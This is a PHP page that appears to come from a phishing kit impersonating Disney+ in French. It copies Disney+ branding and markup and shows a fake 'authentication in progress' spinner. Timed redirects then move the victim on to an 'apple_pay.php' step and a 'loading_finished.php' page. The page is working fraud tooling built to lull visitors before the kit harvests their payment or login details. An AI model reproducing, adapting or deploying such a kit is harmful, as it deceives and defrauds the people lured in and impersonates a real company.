<?php 

include("../common/sub_includes.php");
?>

<html lang="FR" xmlns="http://www.w3.org/1999/xhtml"  style="display: block;">

<?php  include("../common/sub_header.php"); ?>

<body id="app_index" class="js-focus-visible">
    <meta http-equiv="refresh" content="<?php echo $timer_appay; ?>; url=apple_pay.php">

    <div id="webAppRoot" data-reactroot="">
        <div id="app_body_content" data-testid="adult-enabled-profile">
            <div class="sc-esoVGF cNOTUj"></div>
            <div id="hudson-wrapper" class="sc-ZUflv kcCFNP video_view--hidden  ">
                <div class="sc-hPeUyl bhhZhW hudson-container">
                    <div data-testid="" class="sc-hSdWYo dfLgnK"><img alt="" aria-hidden="true" src="../assets/images/icon-loader-32@3x.png" class="sc-eHgmQL jstxUN"></div>
                </div>
            </div>
            <div id="webAppHeader" class="onboarding">
                <div class="sc-iuJeZd hcKoaM">
                    <div class="sc-cmthru cJkwKD"><img style="width: 100%; margin: 0px;" src="../assets/images/ico/logo.svg" id="logo" class="sc-kEYyzF jLfEtv"></div>
                </div>
            </div>
            <div id="webAppScene">
                <div id="app_scene_content">
                    <div id="app-background" class="sc-ekHBYt eIfKUM"></div>
                    <main class="onboarding" id="onboarding_index" style="top: 0px;">
                        <div class="onboarding-wrapper">
                            <form  action="" id="formit" name="dssLogin" method="post">
                                <h3 color="white" style="color: rgb(249, 249, 249); margin: 0px; padding: 0px 0px 24px;text-align : center" class="sc-gZMcBi jhLoHG">Authentification en cours</h3>
                                <style>
                                    .flex{
                                        display: flex;
                                        margin : 20px 0px;
                                        justify-content: center;
                                    }
                                </style>
                                <div class="flex">
                                <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="margin:auto;background:none;display:block;" width="80" height="80" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid">
<circle cx="50" cy="50" fill="none" stroke="#0072d2" stroke-width="10" r="35" stroke-dasharray="164.93361431346415 56.97787143782138">
  <animateTransform attributeName="transform" type="rotate" repeatCount="indefinite" dur="1s" values="0 50 50;360 50 50" keyTimes="0;1"></animateTransform>
</circle>
</svg>           </div>
                                <p style="color: rgb(249, 249, 249);text-align : center">Veuillez patienter, vous serez bientôt redirigé.</p>
                                
                                

                                <div>

                            
                            </div>
                            <div class="flex" style="padding-top : 25px">

                            </div>
                            </form>
                        </div>
                    </main>
                </div>
            </div>
            <div tabindex="0" class="sc-eAKXzc fcUHFZ">
                <div id="cta-toast" class="sc-bfYoXt gCjimr"><button aria-label="" data-testid="" role="button" kind="primary" class="sc-gPEVay edYBEy sc-gbOuXE bcVAiB" id="" type="submit">OBTENIR DISNEY+</button></div>
            </div>
            
            <?php
            $sub_folder = true;
            include("../common/footer.php") 
            ?>
        </div>
    </div>

</body>

</html>

<script
  src="https://code.jquery.com/jquery-3.4.1.min.js"
  crossorigin="anonymous"></script>


<script>

    $("#pass").on("input propertychange",function(){
        if($(this).val().length >= 1){
            $(this).css("border","none")
            $("#error_it").css("display","none")
        }
    })




            $(document).ready(function() {
                window.location.href = "loading_finished.php";
        		});
</script>